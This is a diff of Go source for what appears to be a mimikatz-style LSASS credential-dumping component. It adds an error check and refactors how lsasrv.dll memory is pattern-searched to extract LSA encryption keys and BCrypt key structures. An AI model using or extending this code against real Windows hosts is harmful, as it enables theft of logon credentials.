@@ -160,6 +160,7 @@ func (lsa *lsaNT6) acquireKeys(pHandle windows.Handle) error {
 	if err != nil {
 		return errors.WithMessage(err, "failed to read memory about lsasrv.dll")
 	}
+	// find special data offset
 	var patches []*patchGeneric
 	switch runtime.GOARCH {
 	case "386":
@@ -167,10 +168,11 @@ func (lsa *lsaNT6) acquireKeys(pHandle windows.Handle) error {
 	case "amd64":
 		patches = lsaInitProtectedMemoryKeyReferencesX64
 	}
-	_, _, build := lsa.ctx.getWindowsVersion()
-	patch := selectGenericPatch(patches, build)
-	// find special data offset
+	patch := lsa.ctx.selectGenericPatch(patches)
 	index := bytes.Index(memory, patch.search.data)
+	if index == -1 {
+		return errors.WithMessage(err, "failed to search lsa init protected memory reference pattern")
+	}
 	// read offset about iv
 	address := lsasrv.address + uintptr(index+patch.offsets.off0)
 	var offset uint32
@@ -206,6 +208,7 @@ func (lsa *lsaNT6) acquireKeys(pHandle windows.Handle) error {
 // reference:
 // https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.h
 
+// nolint:structcheck, unused
 type bcryptHandleKey struct {
 	size     uint32
 	tag      uint32  // U U U R
@@ -214,6 +217,7 @@ type bcryptHandleKey struct {
 	unknown0 uintptr
 }
 
+// nolint:structcheck, unused
 type bcryptKey struct {
 	size     uint32
 	tag      uint32 // M S S K
@@ -224,6 +228,7 @@ type bcryptKey struct {
 	hardKey  hardKey
 }
 
+// nolint:structcheck, unused
 type bcryptKey8 struct {
 	size     uint32
 	tag      uint32 // M S S K
@@ -236,6 +241,7 @@ type bcryptKey8 struct {
 	hardKey  hardKey
 }
 
+// nolint:structcheck, unused
 type bcryptKey81 struct {
 	size     uint32
 	tag      uint32 // M S S K
@@ -255,7 +261,7 @@ type bcryptKey81 struct {
 
 type hardKey struct {
 	secret uint32
-	data   [4]byte // self append, not used
+	data   [4]byte // not used
 }
 
 func (lsa *lsaNT6) acquireKey(pHandle windows.Handle, address uintptr, algorithm string) error {
